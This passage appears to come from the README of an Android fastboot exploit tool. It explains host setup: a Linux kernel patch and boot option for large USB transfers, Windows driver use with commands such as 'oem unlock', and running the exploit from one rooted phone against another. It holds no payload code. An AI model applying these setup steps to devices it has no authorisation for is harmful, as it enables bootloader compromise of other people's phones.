Without the kernel patch errors like

::

  [!] libusb_bulk_transfer failed: Insufficient memory ep=0x01 len=0xfff800 size=0xfff800
  [!] fbusb_bufcmd send failed: reqsz=0xfff800 res=0xffffffff

may be shown from running the exploit.

There is ``misc/host-linux-kernel-x86-support-big-usb-transfers.patch``
included with this project for reference how to patch the kernel.

Following kernel command line option is needed in addition to enable
big usb transfers:

::

  usbcore.usbfs_memory_mb=0

Alternatively you may try ``-b maxsize`` command line option of the exploit
to use smaller transfer chunks, but it may cause the exploit to fail entirely.


Windows Host Setup
------------------

In order to use the exploit from Windows, you may need to install a fastboot
driver for your phone in order to access it in fastboot mode.

The usage is the same as with the examples from linux above, just make sure
to use double quotes for commands containing a space, like ``"oem unlock"``.


Usage from Another Phone
------------------------

It is possible to connect two android phones via USB-C adapter (and a powered
USB HUB) and run the exploit from a root shell on one phone in order to exploit
the other phone - just use the ``aarch64`` cross compiled build of the tool.
The root shell of the "host" phone may come from full root or even a temp root.
